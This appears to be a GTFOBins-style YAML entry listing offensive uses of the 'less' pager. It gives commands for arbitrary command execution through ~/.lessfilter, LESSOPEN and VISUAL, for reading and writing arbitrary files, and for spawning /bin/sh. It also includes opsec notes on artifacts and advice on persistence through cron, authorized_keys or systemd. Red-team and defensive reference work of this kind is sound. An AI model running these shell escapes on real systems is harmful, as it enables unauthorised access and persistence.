---
name: less
capabilities:
- exec
- spawn
- read
- write
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: command
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: |-
    cp /path/to/command ~/.lessfilter
    less /etc/hosts
- id: command-2
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: 'LESSOPEN=''/path/to/command # %s'' less /etc/hosts'
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: less /path/to/input-file
- id: file-read-2
  description: Read an arbitrary file.
  capabilities:
  - read
  command: |-
    less /etc/hosts
    :e /path/to/input-file
  notes: This can be used to read another file, e.g., when invoked as a pager with some fixed content.
- id: file-read-3
  description: Read an arbitrary file.
  capabilities:
  - read
  command: 'LESSOPEN=''echo /path/to/input-file # %s'' less /etc/hosts'
  notes: This can be used to read another file.
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: |-
    echo DATA | less
    s/path/to/output-file
    q
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    less /etc/hosts
    !/bin/sh
- id: shell-2
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    LESSOPEN="/bin/sh -s 1>&0 2>&0 # %s" less /etc/hosts
    reset
  notes: The optional `reset` command is needed to receive the echo back of the typed keystrokes.
- id: shell-3
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    VISUAL='/bin/sh -s --' less /etc/hosts
    v
references:
- https://gtfobins.github.io/gtfobins/less/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
